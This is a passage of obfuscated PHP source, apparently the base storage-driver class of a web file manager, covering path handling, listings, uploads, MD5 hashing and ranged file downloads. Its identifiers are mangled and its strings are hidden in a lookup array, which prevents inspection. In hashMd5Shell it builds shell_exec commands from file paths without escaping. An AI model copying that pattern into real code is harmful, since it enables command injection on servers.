$ñĞ¤Õƒú = rtrim(strtolower($ñĞ¤Õƒú), $å„Ä»ØÂ[18]) . $å„Ä»ØÂ[18]; $¦·çÆõŞ = strpos($ñĞ¤Õƒú, $Æºôüì) === 0; return $¦·çÆõŞ; } public function getType() { $ÔşŸú¶ä =& $_SERVER[‰‰Ş‚€]; $õ¨À¬ó¢ = str_replace($ÔşŸú¶ä[87], $ÔşŸú¶ä[22], get_class($this)); return strtolower($õ¨À¬ó¢); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Şí¡Øñ, $í€ØŠÂ‰) { $µ”áÜÕ— =& $_SERVER[‰‰Ş‚€]; $ƒ°òŸ™  = rtrim($Şí¡Øñ, $µ”áÜÕ—[18]) . $µ”áÜÕ—[18] . $í€ØŠÂ‰; $õ°¥–¢Â = $this->exist($ƒ°òŸ™ ); return $õ°¥–¢Â ? $ƒ°òŸ™  : !1; } public function setModifyTime($ÚÇÙÓï, $Ùó¨Ö±İ = '') { } public function renameObject($òÚØŸó, $¿¾¾¯ºù) { $Ù²ÇßÏÀ = $¿¾¾¯ºù; $òÚØŸó = $this->getPathOuter($òÚØŸó); $¿¾¾¯ºù = $this->pathFather($òÚØŸó) . $¿¾¾¯ºù; $†øÑ¯¦ó = IO::copy($òÚØŸó, $this->pathFather($òÚØŸó), REPEAT_RENAME_FOLDER, $Ù²ÇßÏÀ); if ($†øÑ¯¦ó) { IO::remove($òÚØŸó); } return $†øÑ¯¦ó ? $¿¾¾¯ºù : !1; } public function tempFile($Îº‘œÑª = '', $Õ¸–“ò = '') { if (!$Îº‘œÑª) { $Îº‘œÑª = rand_string(15); } $Õ†ŞäŒ¯ = TEMP_FILES . rand_string(15) . $_SERVER[‰‰Ş‚€][18]; @mkdir($Õ†ŞäŒ¯, DEFAULT_PERRMISSIONS, !0); $ùü´®‚Ï = $Õ†ŞäŒ¯ . $Îº‘œÑª; @touch($ùü´®‚Ï); if ($Õ¸–“ò) { file_put_contents($ùü´®‚Ï, $Õ¸–“ò); } return $ùü´®‚Ï; } public function tempFileRemve($àùªØ×–) { @unlink($àùªØ×–); @rmdir($this->pathFather($àùªØ×–)); } public function mkfile($¯«ù÷¨Â, $ŞÀø”’Ÿ = '', $öÜôÍÏ = REPEAT_RENAME) { } public function mkdir($Æ…§«¶Ê, $ÒèÛİÒİ = REPEAT_SKIP) { } public function delFile($‹‘²İßø) { } public function delFolder($˜ÓĞù¿) { } public function copyFile($÷µ€Øº, $Ô°úâÌË) { } public function moveFile($…ô×Äğ¯, $¥òø») { } public function remove($Æ¯Ÿ¤ÃØ) { if ($this->isFile($Æ¯Ÿ¤ÃØ)) { return $this->delFile($Æ¯Ÿ¤ÃØ); } return $this->delFolder($Æ¯Ÿ¤ÃØ); } public function rename($ª×º±ÓŸ, $¨ø‘À¼ó) { } public function exist($ğÉğ›Â¶) { } public function findByHash($”êÉ¸¾ì = '', $ Ï§†ºê = '') { return !1; } public function isFile($©ÑÚÃå¤) { } public function isFolder($”·„®£¯) { } public function size($ò‡”‚‹) { } public function info($‰²½Ú¶Œ) { } public function infoSimple($ğø†ëÖÇ) { return $this->info($ğø†ëÖÇ); } public function infoAuth($ôÍâË©) { return $this->info($ôÍâË©); } public function infoFull($Õ‚åÈØê) { return $this->info($Õ‚åÈØê); } public function infoFullSimple($¡Óœš›ı) { return $this->info($¡Óœš›ı); } public function infoWithChildren($ÂÈŸÚŞæ) { $™Ì§‹×ì =& $_SERVER[‰‰Ş‚€]; static $¼Í„¤¶ = array(); if (isset($¼Í„¤¶[$ÂÈŸÚŞæ])) { return $¼Í„¤¶[$ÂÈŸÚŞæ]; } $–ÊŒºÌÁ = $this->info($ÂÈŸÚŞæ); if ($–ÊŒºÌÁ && $–ÊŒºÌÁ[$™Ì§‹×ì[43]] == $™Ì§‹×ì[88]) { $³Ò×äŠñ = array($™Ì§‹×ì[89] => 0, $™Ì§‹×ì[90] => 0, $™Ì§‹×ì[91] => 0); $this->infoChildren($ÂÈŸÚŞæ, $³Ò×äŠñ); $–ÊŒºÌÁ[$™Ì§‹×ì[89]] = $³Ò×äŠñ[$™Ì§‹×ì[89]]; $–ÊŒºÌÁ[$™Ì§‹×ì[92]] = array($™Ì§‹×ì[93] => $³Ò×äŠñ[$™Ì§‹×ì[90]], $™Ì§‹×ì[94] => $³Ò×äŠñ[$™Ì§‹×ì[91]]); $¼Í„¤¶[$ÂÈŸÚŞæ] = $–ÊŒºÌÁ; } return $–ÊŒºÌÁ; } public function listPath($®¥Á¸©°, $ç”Ê¶“Ì = false) { } public function has($Í¶šº÷š, $£‹’Á = false, $ò’‡ª¼ = false) { } public function canRead($Ç³ëÍ¬Ş) { } public function canWrite($›°‘µğ) { } public function getContent($Ï´ª•³ö) { } public function setContent($»Øâ¾ÅÒ, $Æ´ÁäæÎ = '') { } protected function infoChildren($Ğ†Øá‰Î, &$ËÖúŒ™) { $¸âó‘µ =& $_SERVER[‰‰Ş‚€]; check_abort_echo(); $Õ†…ï°¼ = $this->listPath($Ğ†Øá‰Î, !0); $Õ†…ï°¼ = array_merge($Õ†…ï°¼[$¸âó‘µ[95]], $Õ†…ï°¼[$¸âó‘µ[96]]); foreach ($Õ†…ï°¼ as $ÕÈÒ¢ı) { if ($ÕÈÒ¢ı[$¸âó‘µ[43]] == $¸âó‘µ[88]) { $ËÖúŒ™[$¸âó‘µ[91]]++; $÷ªº–À® = $this->getPathInner($ÕÈÒ¢ı[$¸âó‘µ[97]]); $this->infoChildren($÷ªº–À®, $ËÖúŒ™); } else { $ËÖúŒ™[$¸âó‘µ[90]]++; $ËÖúŒ™[$¸âó‘µ[89]] += $ÕÈÒ¢ı[$¸âó‘µ[89]]; } } } public function fileSubstr($Œ¹¼“ì£, $î“ÀÓ, $ö÷ƒ‘â¡) { } public function listAll($…¬”ùù¯) { } public function listAllMake($½€ìÅº®, &$™Ù©À©) { $¹ªßØùã =& $_SERVER[‰‰Ş‚€]; check_abort_echo(); $ğüê×¡® = $this->listPath($½€ìÅº®, !0); if (!$ğüê×¡®) { return; } $ÌªŞ¹õà = array_merge($ğüê×¡®[$¹ªßØùã[95]], $ğüê×¡®[$¹ªßØùã[96]]); foreach ($ÌªŞ¹õà as $ì¿°Éã‡) { $Ş¬éü®É = $ì¿°Éã‡[$¹ªßØùã[43]] == $¹ªßØùã[88]; $ãş‡û¡™ = array($¹ªßØùã[97] => $ì¿°Éã‡[$¹ªßØùã[97]], $¹ªßØùã[88] => $Ş¬éü®É); if (isset($ì¿°Éã‡[$¹ªßØùã[89]])) { $ãş‡û¡™[$¹ªßØùã[89]] = $ì¿°Éã‡[$¹ªßØùã[89]]; } if (isset($ì¿°Éã‡[$¹ªßØùã[98]])) { $ãş‡û¡™[$¹ªßØùã[98]] = $ì¿°Éã‡[$¹ªßØùã[98]]; } if (!$Ş¬éü®É) { $™Ù©À©[] = $ãş‡û¡™; continue; } $™Ù©À©[] = $ãş‡û¡™; $Æ©¤Ü°Û = $ì¿°Éã‡[$¹ªßØùã[97]]; $”ëµ‰ı = $this->pathDriver; if (substr($ì¿°Éã‡[$¹ªßØùã[97]], 0, strlen($”ëµ‰ı)) == $”ëµ‰ı) { $Æ©¤Ü°Û = substr($Æ©¤Ü°Û, strlen($”ëµ‰ı)); } $this->listAllMake($Æ©¤Ü°Û, $™Ù©À©); } } public function listAllSimple($Ü†¨‚˜†, $´¿ÆÔãü = false) { $ö˜©²úÙ = $this->listAll($Ü†¨‚˜†); return $this->listAllSimpleMake($ö˜©²úÙ, $this->getPathOuter($Ü†¨‚˜†), $´¿ÆÔãü); } public function listAllSimpleMake($ô‚ÆÍÑ, $İ’ü¨Æ, $¡Â½ğ¡ß) { $¸Ö®ß‚¼ =& $_SERVER[‰‰Ş‚€]; $¬ Û†ñê = array(); $İ’ü¨Æ = rtrim(get_path_father($İ’ü¨Æ), $¸Ö®ß‚¼[18]) . $¸Ö®ß‚¼[18]; foreach ($ô‚ÆÍÑ as $ˆ›©íŠ—) { $¡³ğûÍÁ = array($¸Ö®ß‚¼[97] => $ˆ›©íŠ—[$¸Ö®ß‚¼[97]], $¸Ö®ß‚¼[99] => $ˆ›©íŠ—[$¸Ö®ß‚¼[97]], $¸Ö®ß‚¼[88] => $ˆ›©íŠ—[$¸Ö®ß‚¼[88]]); if (isset($ˆ›©íŠ—[$¸Ö®ß‚¼[89]]) && !$ˆ›©íŠ—[$¸Ö®ß‚¼[88]]) { $¡³ğûÍÁ[$¸Ö®ß‚¼[89]] = $ˆ›©íŠ—[$¸Ö®ß‚¼[89]]; } if (isset($ˆ›©íŠ—[$¸Ö®ß‚¼[98]])) { $¡³ğûÍÁ[$¸Ö®ß‚¼[98]] = $ˆ›©íŠ—[$¸Ö®ß‚¼[98]]; } if (is_array($ˆ›©íŠ—[$¸Ö®ß‚¼[100]])) { $¡³ğûÍÁ[$¸Ö®ß‚¼[99]] = $ˆ›©íŠ—[$¸Ö®ß‚¼[100]][$¸Ö®ß‚¼[97]]; $¡³ğûÍÁ[$¸Ö®ß‚¼[89]] = $ˆ›©íŠ—[$¸Ö®ß‚¼[100]][$¸Ö®ß‚¼[89]]; $¡³ğûÍÁ[$¸Ö®ß‚¼[98]] = $ˆ›©íŠ—[$¸Ö®ß‚¼[100]][$¸Ö®ß‚¼[98]]; } else { if (substr($ˆ›©íŠ—[$¸Ö®ß‚¼[97]], 0, strlen($İ’ü¨Æ)) == $İ’ü¨Æ) { $¡³ğûÍÁ[$¸Ö®ß‚¼[97]] = substr($ˆ›©íŠ—[$¸Ö®ß‚¼[97]], strlen($İ’ü¨Æ)); } } $èòÀÄá = $ˆ›©íŠ—[$¸Ö®ß‚¼[88]] ? $¸Ö®ß‚¼[18] : $¸Ö®ß‚¼[22]; $¡³ğûÍÁ[$¸Ö®ß‚¼[99]] = rtrim($¡³ğûÍÁ[$¸Ö®ß‚¼[99]], $¸Ö®ß‚¼[18]) . $èòÀÄá; $¡³ğûÍÁ[$¸Ö®ß‚¼[97]] = $¸Ö®ß‚¼[18] . trim($¡³ğûÍÁ[$¸Ö®ß‚¼[97]], $¸Ö®ß‚¼[18]) . $èòÀÄá; if (!$¡Â½ğ¡ß) { $ªÖ¿†³ = explode($¸Ö®ß‚¼[18], trim($¡³ğûÍÁ[$¸Ö®ß‚¼[97]], $¸Ö®ß‚¼[18])); $¡³ğûÍÁ[$¸Ö®ß‚¼[97]] = $¸Ö®ß‚¼[18] . implode($¸Ö®ß‚¼[18], array_slice($ªÖ¿†³, 1)) . $èòÀÄá; } $¬ Û†ñê[] = $¡³ğûÍÁ; } return array_sort_by($¬ Û†ñê, $¸Ö®ß‚¼[97]); } public function upload($–˜ëıä, $¿à­¯½ë, $¸”ø¤×ş = false, $³è¹Ù–Ö = REPEAT_REPLACE) { } public function uploadFileByID($’õò¹Œê, $µÚµìú, $Şğ›”ª²) { } public function uploadFileByPath($Á€—úÕ¹, $”²åäß, $¸¤î‹¾ˆ = array()) { } public function isUploadServer() { $›ö­Ší¯ =& $_SERVER[‰‰Ş‚€]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $›ö­Ší¯[101]) { return !0; } return $GLOBALS[$›ö­Ší¯[16]][$›ö­Ší¯[102]][$›ö­Ší¯[103]]; } public function isFileOutServer() { $’ÓÉÙÛ´ =& $_SERVER[‰‰Ş‚€]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $’ÓÉÙÛ´[101]) { return !0; } return $GLOBALS[$’ÓÉÙÛ´[16]][$’ÓÉÙÛ´[102]][$’ÓÉÙÛ´[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($õØõæÊÄ) { $Áóˆ·éá =& $_SERVER[‰‰Ş‚€]; if (!$this->isCdnHost()) { return $õØõæÊÄ; } return str_replace(trim(get_url_root($õØõæÊÄ), $Áóˆ·éá[18]), trim($this->cdnHost, $Áóˆ·éá[18]), $õØõæÊÄ); } public function uploadLink($ÚÊíòÔŠ, $ã¾úŠ = 0) { $ ¹é„Ï =& $_SERVER[‰‰Ş‚€]; if ($this->isUploadServer()) { return; } $»ÇƒÕıÌ = $this->getType(); if (!in_array($»ÇƒÕıÌ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ş›â¨é¦ = 1024 * 1024 * 10; $Õúîëâ· = (!$ã¾úŠ ? 1 : ceil($ã¾úŠ / pow(1024, 3))) * 3600 * 4; if ($ã¾úŠ <= $ş›â¨é¦) { $âÙ«åÕ¨ = $this->uploadFormData($ÚÊíòÔŠ, $Õúîëâ·); } else { $âÙ«åÕ¨ = $this->uploadMultiData($ÚÊíòÔŠ, $Õúîëâ·); } if ($âÙ«åÕ¨) { $âÙ«åÕ¨[$ ¹é„Ï[105]] = $ÚÊíòÔŠ; $âÙ«åÕ¨[$ ¹é„Ï[106]] = $»ÇƒÕıÌ; } return $âÙ«åÕ¨; } public function uploadFormData($õµÈÏ½», $ŞÀğµŠî = 3600) { } public function uploadMultiData($‘†¥òòÜ, $¢İ ÄŸ” = 3600) { } public function multiUploadFormData($ÉÆÖœˆÍ, $ˆÁãÅğ = 3600) { return $this->uploadMultiData($ÉÆÖœˆÍ, $ˆÁãÅğ); } public function download($¡ã¾ü¶Ş, $£ä‰½è) { } public function ext($ƒùè¤ƒ‚) { $áÜ¡õâƒ =& $_SERVER[‰‰Ş‚€]; if (strpos($ƒùè¤ƒ‚, $áÜ¡õâƒ[18]) === -1) { $ğø¯ë—¶ = $ƒùè¤ƒ‚; } else { $ğø¯ë—¶ = $this->pathThis($ƒùè¤ƒ‚); } $Æ”éúÏ™ = $áÜ¡õâƒ[22]; if (strstr($ğø¯ë—¶, $áÜ¡õâƒ[20])) { $Æ”éúÏ™ = substr($ğø¯ë—¶, strrpos($ğø¯ë—¶, $áÜ¡õâƒ[20]) + 1); $Æ”éúÏ™ = strtolower($Æ”éúÏ™); } if (strlen($Æ”éúÏ™) > 3 && preg_match($áÜ¡õâƒ[107], $Æ”éúÏ™, $ÂÆ×™Åª)) { $Æ”éúÏ™ = $áÜ¡õâƒ[22]; } return $Æ”éúÏ™; } public function pathThis($áÒˆø‘) { $–¿«ÈÉ =& $_SERVER[‰‰Ş‚€]; $áÒˆø‘ = str_replace($–¿«ÈÉ[108], $–¿«ÈÉ[18], rtrim($áÒˆø‘, $–¿«ÈÉ[18])); $¡‚‡“ªÁ = strrpos($áÒˆø‘, $–¿«ÈÉ[18]); if ($¡‚‡“ªÁ === !1) { return $áÒˆø‘; } return substr($áÒˆø‘, $¡‚‡“ªÁ + 1); } public function pathFather($íŠ‡û²ê) { $•†ë¤ =& $_SERVER[‰‰Ş‚€]; $íŠ‡û²ê = str_replace($•†ë¤[108], $•†ë¤[18], rtrim($íŠ‡û²ê, $•†ë¤[18])); $´òîÉô = strrpos($íŠ‡û²ê, $•†ë¤[18]); if ($´òîÉô === !1) { return $•†ë¤[22]; } return substr($íŠ‡û²ê, 0, $´òîÉô + 1); } public function hashSimple($‰¿„Ù¯) { $ Ç¡·öß =& $_SERVER[‰‰Ş‚€]; if (!$‰¿„Ù¯) { return md5($ Ç¡·öß[22]); } $¶ß»×Âç = $this->size($‰¿„Ù¯); $ñ½¤Ú‚‰ = 200; $Ç«ÜÏûú = 50; if ($¶ß»×Âç <= $ñ½¤Ú‚‰ * $Ç«ÜÏûú) { return $this->hashMd5($‰¿„Ù¯) . $¶ß»×Âç; } $ßÁ¨¸»ñ = intval($¶ß»×Âç / $Ç«ÜÏûú); $¹­¼—İ = $ Ç¡·öß[22]; for ($–›Îá× = 0; $–›Îá× < $Ç«ÜÏûú; $–›Îá×++) { $¹­¼—İ .= $this->fileSubstr($‰¿„Ù¯, $ßÁ¨¸»ñ * $–›Îá×, $ñ½¤Ú‚‰); } $¹­¼—İ .= $this->fileSubstr($‰¿„Ù¯, $¶ß»×Âç - $ñ½¤Ú‚‰, $ñ½¤Ú‚‰); return md5($¹­¼—İ) . $¶ß»×Âç; } public static $md5Cache = array(); public function hashMd5($í¬ö¸®¡) { if (!$í¬ö¸®¡) { return md5($_SERVER[‰‰Ş‚€][22]); } $í¬ö¸®¡ = $this->iconvSystem($í¬ö¸®¡); if (isset(self::$md5Cache[$í¬ö¸®¡])) { return self::$md5Cache[$í¬ö¸®¡]; } self::$md5Cache[$í¬ö¸®¡] = $this->hashMd5Shell($í¬ö¸®¡); if (!self::$md5Cache[$í¬ö¸®¡]) { self::$md5Cache[$í¬ö¸®¡] = @md5_file($í¬ö¸®¡); } return self::$md5Cache[$í¬ö¸®¡]; } private function hashMd5Shell($çÌ¿„’Á) { $ğ‘÷Ë« =& $_SERVER[‰‰Ş‚€]; if (!$çÌ¿„’Á) { return md5($ğ‘÷Ë«[22]); } if (!function_exists($ğ‘÷Ë«[109])) { return !1; } $›»•áŞ· = array($ğ‘÷Ë«[110], $ğ‘÷Ë«[111]); $Ö„Ùêø® = Cache::get($ğ‘÷Ë«[112]); if (!$Ö„Ùêø®) { $…–ÅÓ€¹ = BASIC_PATH . $ğ‘÷Ë«[113]; $¾Å¢Í ğ = md5_file($…–ÅÓ€¹); $Ö„Ùêø® = $ğ‘÷Ë«[114]; foreach ($›»•áŞ· as $«ƒÂëœ) { $ Ì­ÜØÔ = shell_exec($«ƒÂëœ . "\40\42{$…–ÅÓ€¹}\42"); if ($ Ì­ÜØÔ && substr(trim($ Ì­ÜØÔ), 0, 32) == $¾Å¢Í ğ) { $Ö„Ùêø® = $«ƒÂëœ; break; } } Cache::set($ğ‘÷Ë«[112], $Ö„Ùêø®, 3600); } if ($Ö„Ùêø® == $ğ‘÷Ë«[114]) { return !1; } $ Ì­ÜØÔ = shell_exec($Ö„Ùêø® . "\40\42{$çÌ¿„’Á}\x22"); $ Ì­ÜØÔ = str_replace($ğ‘÷Ë«[115], $ğ‘÷Ë«[22], $ Ì­ÜØÔ); return substr($ Ì­ÜØÔ, 0, 32); } public function link($Äõ¿ÆĞ) { return $Äõ¿ÆĞ; } public function fileOut($÷ƒÕâ“‡, $‘Ñ™‚‹¹ = false, $„ ÑìòÚ = false, $»Ò‘Ê³à = '') { $œâî«ô =& $_SERVER[‰‰Ş‚€]; $this->cacheMethod(null, null); if (!$÷ƒÕâ“‡ || !$this->exist($÷ƒÕâ“‡)) { show_json(LNG($œâî«ô[116]), !1, $„ ÑìòÚ); } $ç™²¿³ = $this->getType() == $œâî«ô[117]; $Åš’İşŒ = $GLOBALS[$œâî«ô[16]][$œâî«ô[102]][$œâî«ô[118]][$œâî«ô[119]]; $İâÓšïú = (double) $GLOBALS[$œâî«ô[16]][$œâî«ô[102]][$œâî«ô[118]][$œâî«ô[120]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ô¹İ†´ = $this->infoFull($÷ƒÕâ“‡); $ÅïË÷ø = $ô¹İ†´[$œâî«ô[89]]; $©¢ÛõàÍ = gmdate($œâî«ô[121], $ô¹İ†´[$œâî«ô[98]]); $ş™¿·ö = $„ ÑìòÚ ? $„ ÑìòÚ : $this->iconvApp($ô¹İ†´[$œâî«ô[42]]); $ÒÂÖùò = 0; $é´øËŠñ = $ÅïË÷ø - 1; $î¬®±Ì´ = $this->ext($ş™¿·ö); if (in_array($î¬®±Ì´, array($œâî«ô[122], $œâî«ô[123], $œâî«ô[124], $œâî«ô[125]))) { $î¬®±Ì´ = $œâî«ô[126]; } if (in_array($î¬®±Ì´, array($œâî«ô[127]))) { $î¬®±Ì´ = $œâî«ô[128]; } if (!$»Ò‘Ê³à) { $»Ò‘Ê³à = md5($©¢ÛõàÍ . $ÅïË÷ø); } $»Ò‘Ê³à = $œâî«ô[129] . $»Ò‘Ê³à . $œâî«ô[129]; $ÜÉçÏéÁ = get_file_mime($î¬®±Ì´); $Ù†ä…ºò = !0; $Ù†ä…ºò = isset($_GET[$œâî«ô[130]]) ? !1 : !0; if ($‘Ñ™‚‹¹ === !1 && !mime_support($ÜÉçÏéÁ)) { $ÜÉçÏéÁ = $œâî«ô[131]; } header($œâî«ô[132]); header($œâî«ô[133] . $ÜÉçÏéÁ); $Ò±œ‚½¸ = rawurlencode($ş™¿·ö); $Ò±œ‚½¸ = $œâî«ô[129] . $Ò±œ‚½¸ . $œâî«ô[134] . $Ò±œ‚½¸; if ($‘Ñ™‚‹¹) { header($œâî«ô[135]); header($œâî«ô[136] . $Ò±œ‚½¸); } else { if ($Ù†ä…ºò) { header($œâî«ô[137] . $Ò±œ‚½¸); } } $¿…–‰ = 3600 * 24 * 30; header($œâî«ô[138]); header($œâî«ô[139]); header($œâî«ô[140] . $¿…–‰); header($œâî«ô[141] . gmdate($œâî«ô[121], time() + $¿…–‰) . $œâî«ô[142]); if (isset($_SERVER[$œâî«ô[143]]) && strtotime($_SERVER[$œâî«ô[143]]) == $ô¹İ†´[$œâî«ô[98]]) { header($œâî«ô[144], !0, 304); die; } if (isset($_SERVER[$œâî«ô[145]]) && $_SERVER[$œâî«ô[145]] == $»Ò‘Ê³à) { header($œâî«ô[146] . $»Ò‘Ê³à, !0, 304); die; } header($œâî«ô[146] . $»Ò‘Ê³à); header($œâî«ô[147] . $©¢ÛõàÍ . $œâî«ô[142]); header($œâî«ô[148] . rawurlencode($ş™¿·ö)); header($œâî«ô[149]); header($œâî«ô[150] . $ÅïË÷ø); header($œâî«ô[151]); Hook::trigger($œâî«ô[152], $÷ƒÕâ“‡, $ÅïË÷ø, $ş™¿·ö, $î¬®±Ì´); if (!$‘Ñ™‚‹¹ && $î¬®±Ì´ == $œâî«ô[153]) { if ($ÅïË÷ø > 1024 * 1024 * 10) { die; } $·°ŸıÇÅ = $this->getContent($÷ƒÕâ“‡); $·°ŸıÇÅ = Html::clearSVG($·°ŸıÇÅ); header($œâî«ô[154] . strlen($·°ŸıÇÅ)); echo $·°ŸıÇÅ; die; } $Ã³ş¾è = strtolower($_SERVER[$œâî«ô[155]]); if ($ç™²¿³ && $Ã³ş¾è && $Åš’İşŒ) { if (strstr($Ã³ş¾è, $œâî«ô[156])) { header($œâî«ô[157] . $÷ƒÕâ“‡); } else { if (strstr($Ã³ş¾è, $œâî«ô[158])) { header($œâî«ô[159] . $÷ƒÕâ“‡); } else { if (strstr($Ã³ş¾è, $œâî«ô[160])) { header($œâî«ô[161] . $÷ƒÕâ“‡); } } } if ($İâÓšïú) { header($œâî«ô[162] . $İâÓšïú); } return; } if (isset($_SERVER[$œâî«ô[163]])) { if (preg_match($œâî«ô[164], $_SERVER[$œâî«ô[163]], $óÓÏÌ»ì)) { $ÒÂÖùò = intval($óÓÏÌ»ì[1]); $ÒÂÖùò = $ÒÂÖùò <= 0 ? 0 : ($ÒÂÖùò >= $é´øËŠñ ? $é´øËŠñ : $ÒÂÖùò); if (!empty($óÓÏÌ»ì[2])) { $åÀ…ß×« = intval($óÓÏÌ»ì[2]); $é´øËŠñ = $åÀ…ß×« < $ÒÂÖùò ? $ÒÂÖùò : ($åÀ…ß×« >= $é´øËŠñ ? $é´øËŠñ : $åÀ…ß×«); } } header($œâî«ô[165]); header("\x43\x6f\x6e\x74\145\x6e\x74\x2d\122\141\156\x67\x65\72\x20\x62\171\164\145\x73\40{$ÒÂÖùò}\x2d{$é´øËŠñ}\x2f" . $ÅïË÷ø); } else { header($œâî«ô[166]); } header($œâî«ô[167]); header($œâî«ô[168]); $åõé†Ì = !0; if ($_SERVER[$œâî«ô[169]] == $œâî«ô[170] && $ÅïË÷ø > 1204 * 1024 * 1024 * 2) { $åõé†Ì = !1; } if ($åõé†Ì) { header($œâî«ô[171] . ($é´øËŠñ - $ÒÂÖùò + 1)); } if ($_SERVER[$œâî«ô[172]] == $œâî«ô[173]) { return; } $ììÕ¢À = array($œâî«ô[174] => !1, $œâî«ô[175] => $ÒÂÖùò, $œâî«ô[176] => $é´øËŠñ, $œâî«ô[177] => $î¬®±Ì´, $œâî«ô[178] => $ô¹İ†´, $œâî«ô[179] => $œâî«ô[22], $œâî«ô[180] => 0); $ììÕ¢À = Hook::filter($œâî«ô[181], $ììÕ¢À); $¨“¯À¿Ü = 1024 * 300; $¢›Ç»¡¸ = 0; if ($İâÓšïú) { $¢›Ç»¡¸ = intval(1000 * 1000 * ($¨“¯À¿Ü / $İâÓšïú)); } while ($ÒÂÖùò <= $é´øËŠñ) { $ù¨“¥¤„ = timeFloat(); check_abort(); $¤ÜñÃ = $é´øËŠñ - $ÒÂÖùò + 1; if ($¤ÜñÃ <= $¨“¯À¿Ü) { $¨“¯À¿Ü = $¤ÜñÃ; } $·°ŸıÇÅ = $this->fileSubstr($÷ƒÕâ“‡, $ÒÂÖùò, $¨“¯À¿Ü); if ($ììÕ¢À[$œâî«ô[174]]) { $ììÕ¢À[$œâî«ô[179]] = $·°ŸıÇÅ; $ììÕ¢À[$œâî«ô[180]] = $ÒÂÖùò; $ììÕ¢À = Hook::filter($œâî«ô[182], $ììÕ¢À); $·°ŸıÇÅ = $ììÕ¢À[$œâî«ô[179]]; } echo $·°ŸıÇÅ; $ÒÂÖùò += $¨“¯À¿Ü; if ($¨“¯À¿Ü == $¤ÜñÃ) { $ÒÂÖùò = $é´øËŠñ + 1; } if ($¢›Ç»¡¸) { $›à¡äƒâ = intval(1000 * 1000 * (timeFloat() - $ù¨“¥¤„)); $¥†ÎÚßÒ = $¢›Ç»¡¸ - $›à¡äƒâ; if ($¥†ÎÚßÒ > 5) { usleep($¥†ÎÚßÒ); } } } } public function fileOutServer($õè×ñ¹ª, $ Ô™³íã = false, $ÛĞÖ¤Ğ© = false, $–Äìä±· = '') { $this->fileOut($õè×ñ¹ª, $ Ô™³íã, $ÛĞÖ¤Ğ©, $–Äìä±·); } public function fileOutLink($”÷‚¦¸½) { header($_SERVER[‰‰Ş‚€][183] . $”÷‚¦¸½); die; } public function cacheMethod($§óĞÀÜ€, $ëƒ¤¬ª£, $™Ã±Š´† = null) { $¢ô´ƒñÃ =& $_SERVER[‰‰Ş‚€]; static $ì“©±Šä = array(); $ÉĞãÂÏ = $ëƒ¤¬ª£ ? ltrim($this->getPathOuter($ëƒ¤¬ª£), $¢ô´ƒñÃ[18]) : $¢ô´ƒñÃ[22]; $Ø¸µüŸ = $¢ô´ƒñÃ[184] . $§óĞÀÜ€ . $¢ô´ƒñÃ[185] . rtrim($ÉĞãÂÏ, $¢ô´ƒñÃ[18]); if (is_null($§óĞÀÜ€)) { $ì“©±Šä = array(); return; } if (is_null($ëƒ¤¬ª£)) { foreach ($ì“©±Šä as $Ø¸µüŸ => $ÀõŒàå˜) { if (!strstr($Ø¸µüŸ, $¢ô´ƒñÃ[184] . $§óĞÀÜ€ . $¢ô´ƒñÃ[186])) { continue; } unset($ì“©±Šä[$Ø¸µüŸ]); } return; } if ($™Ã±Š´† === $¢ô´ƒñÃ[187]) { unset($ì“©±Šä[$Ø¸µüŸ]); return; } if (!is_null($™Ã±Š´†)) { $ì“©±Šä[$Ø¸µüŸ] = $™Ã±Š´†; return; } $ ö»µú§ = isset($ì“©±Šä[$Ø¸µüŸ]) ? $ì“©±Šä[$Ø¸µüŸ] : null; if (!is_null($ ö»µú§)) { return $ ö»µú§; } $ ö»µú§ = $this->{$§óĞÀÜ€}($ëƒ¤¬ª£); $ì“©±Šä[$Ø¸µüŸ] = $ ö»µú§; return $ ö»µú§; } public function cacheMethodInfoSet($¶·«Óø, $òÒÜå„ü, $‘š¦Âê× = false) { $›Ë³Á° =& $_SERVER[‰‰Ş‚€]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($›Ë³Á°[188], $¶·«Óø, $òÒÜå„ü); $this->cacheMethod($›Ë³Á°[189], $¶·«Óø, $òÒÜå„ü ? !1 : !0); if (is_array($‘š¦Âê×)) { $this->cacheMethod($›Ë³Á°[190], $¶·«Óø, $‘š¦Âê×); } } public function fileOutImage($•Ô ¶îÌ, $å‡ôÑ¤è = 250) { $šÜáØî¼ =& $_SERVER[‰‰Ş‚€]; set_timeout(); if (substr($•Ô ¶îÌ, 0, 4) == $šÜáØî¼[160]) { $this->fileOutLink($•Ô ¶îÌ); } $Û¼¾‹­“ = $this->info($•Ô ¶îÌ); $‡†‹íê = !1; $Ší€®ªß = isset($GLOBALS[$šÜáØî¼[191]]) ? $GLOBALS[$šÜáØî¼[191]] : array(); if ($Ší€®ªß && $Ší€®ªß[$šÜáØî¼[192]] == $Û¼¾‹­“[$šÜáØî¼[97]]) { $Û¼¾‹­“ = $Ší€®ªß; $¿©¬–²Ò = $Û¼¾‹­“[$šÜáØî¼[193]]; if ($¿©¬–²Ò && isset($¿©¬–²Ò[$šÜáØî¼[194]])) { if ($¿©¬–²Ò[$šÜáØî¼[194]] <= $å‡ôÑ¤è && $¿©¬–²Ò[$šÜáØî¼[195]] <= $å‡ôÑ¤è) { $‡†‹íê = !0; } } } if ($Û¼¾‹­“[$šÜáØî¼[89]] <= 1024 * 50 || $‡†‹íê || !function_exists($šÜáØî¼[196]) || $Û¼¾‹­“[$šÜáØî¼[177]] == $šÜáØî¼[197]) { return $this->fileOut($•Ô ¶îÌ, !1, $Û¼¾‹­“[$šÜáØî¼[42]]); } $ËÇ©ì£‹ = kodIO::hashPath($Û¼¾‹­“); $¬Ûõ’áŸ = "\143\x6f\x76\x65\x72\137{$ËÇ©ì£‹}\x5f{$å‡ôÑ¤è}\x2e\160\156\147"; $ãÆ¬šŞÎ = IO_PATH_SYSTEM_TEMP . $šÜáØî¼[198]; $óÔêÑ = IO::infoFullSimple($ãÆ¬šŞÎ); $ÉØ§ŠÍ¤ = $óÔêÑ && is_array($óÔêÑ) ? $óÔêÑ[$šÜáØî¼[97]] : $šÜáØî¼[22]; if (!$ÉØ§ŠÍ¤) { 